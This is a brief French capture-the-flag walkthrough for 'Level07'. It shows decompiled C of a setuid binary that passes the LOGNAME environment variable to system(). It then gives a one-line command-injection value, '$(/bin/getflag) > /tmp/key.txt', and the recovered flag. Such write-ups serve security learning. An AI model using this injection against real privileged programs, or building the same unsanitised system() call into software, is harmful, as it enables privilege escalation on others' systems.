## Level07:

https://dogbolt.org/?id=c0805f22-ef97-46b0-83aa-91f95bdac7f7#Ghidra=190
on passe l'executable dans un decompileur en ligne ci dessus
On remarque ceci : 
```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}

```
la ligne qui nous interesse c'est `getenv("LOGNAME")`

On fait un injection de code grace a cette env telque : 
` export LOGNAME='$(/bin/getflag) > /tmp/key.txt'`
et on va regarder tout simplement dans le fichier notre key : fiumuikeil55xe9cu4dood66h
